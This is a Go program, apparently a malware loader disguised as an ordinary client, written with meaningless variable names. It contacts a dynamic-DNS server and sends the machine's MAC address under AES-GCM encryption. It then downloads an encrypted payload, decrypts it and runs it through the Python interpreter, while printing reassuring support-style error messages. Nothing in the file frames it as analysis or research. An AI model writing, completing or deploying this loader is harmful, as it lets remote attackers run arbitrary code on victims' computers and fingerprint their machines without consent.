package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
)

var a = []byte{0x75, 0x56, 0x66, 0x4e, 0x43, 0x48, 0x6c, 0x55, 0x58, 0x42, 0x59, 0x3d}

func b() error {
	c := exec.Command(string([]byte("python")), string([]byte("--version")))
	return c.Run()
}

func c() string {
	d, e := net.Interfaces()
	if e != nil || len(d) == 0 {
		return ""
	}
	return fmt.Sprintf("%x", d[0].HardwareAddr)
}

func f(g map[string]string, h string) ([]byte, error) {
	i, j := g[h]
	if !j {
		return nil, fmt.Errorf("missing key: %s", h)
	}
	k, l := base64.StdEncoding.DecodeString(i)
	if l != nil {
		return nil, fmt.Errorf("base64 decode failed for key %s: %v", h, l)
	}
	return k, nil
}

func main() {
	m := "https://aimengine.duckdns.org"

	n, o := http.Get(m)
	if o != nil {
		fmt.Println("Error: Unable to reach the server. Please try again later.")
		os.Exit(1)
	}
	defer n.Body.Close()

	var p map[string]string
	q, r := io.ReadAll(n.Body)
	if r != nil {
		fmt.Println("Error: Failed to read server response. Please try again.")
		os.Exit(1)
	}

	s := json.Unmarshal(q, &p)
	if s != nil {
		fmt.Println("Error: Failed to parse server response. Please try again.")
		os.Exit(1)
	}

	fmt.Println("Server response received and validated.")

	t := p["session_id"]
	u, v := f(p, "auth_nonce")
	if v != nil || len(u) != 12 {
		fmt.Println("Error: Invalid authentication nonce. Please contact support.")
		os.Exit(1)
	}
	w, x := f(p, "payload_nonce")
	if x != nil || len(w) != 12 {
		fmt.Println("Error: Invalid payload nonce. Please contact support.")
		os.Exit(1)
	}
	y, z := f(p, "key")
	if z != nil || len(y) != 32 {
		fmt.Println("Error: Invalid encryption key. Please contact support.")
		os.Exit(1)
	}

	a1 := map[string]string{
		"key":  string(a),
		"uuid": c(),
	}
	a2, _ := json.Marshal(a1)

	b1, a3 := aes.NewCipher(y)
	if a3 != nil {
		fmt.Println("Error: AES cipher creation failed. Please try again.")
		os.Exit(1)
	}
	a4, a5 := cipher.NewGCM(b1)
	if a5 != nil {
		fmt.Println("Error: GCM cipher creation failed. Please try again.")
		os.Exit(1)
	}

	b2 := a4.Seal(nil, u, a2, nil)

	a6 := map[string]string{
		"session_id": t,
		"data":       base64.StdEncoding.EncodeToString(b2),
	}
	var a7 bytes.Buffer
	if a8 := json.NewEncoder(&a7).Encode(a6); a8 != nil {
		fmt.Println("Error: Failed to encode data. Please try again.")
		os.Exit(1)
	}

	b3, a9 := http.Post(m, "application/json", &a7)
	if a9 != nil || b3.StatusCode != http.StatusOK {
		fmt.Println("Error: Authentication request failed. Please try again later.")
		os.Exit(1)
	}
	defer b3.Body.Close()

	c1 := fmt.Sprintf("%s/download?session_id=%s", m, t)
	b4, a10 := http.Get(c1)
	if a10 != nil {
		fmt.Println("Error: Failed to download file. Please try again later.")
		os.Exit(1)
	}
	defer b4.Body.Close()

	c2, a11 := io.ReadAll(b4.Body)
	if a11 != nil {
		fmt.Println("Error: Failed to read downloaded payload. Please try again.")
		os.Exit(1)
	}
	c3, a12 := base64.StdEncoding.DecodeString(string(c2))
	if a12 != nil {
		fmt.Println("Error: Failed to decode the downloaded payload. Please try again.")
		os.Exit(1)
	}

	d1, a13 := a4.Open(nil, w, c3, nil)
	if a13 != nil {
		fmt.Println("Error: Failed to decrypt the payload. Please try again.")
		os.Exit(1)
	}

	if a14 := b(); a14 != nil {
		fmt.Println("Error: Python is not installed or not configured correctly. Please install Python and try again.")
		os.Exit(1)
	}

	d2 := exec.Command("python")
	d2.Stdin = bytes.NewReader(d1)
	d2.Stdout = os.Stdout
	d2.Stderr = os.Stderr
	if a15 := d2.Run(); a15 != nil {
		fmt.Println("Error: Failed to execute the script. Please try again.")
		os.Exit(1)
	}
}
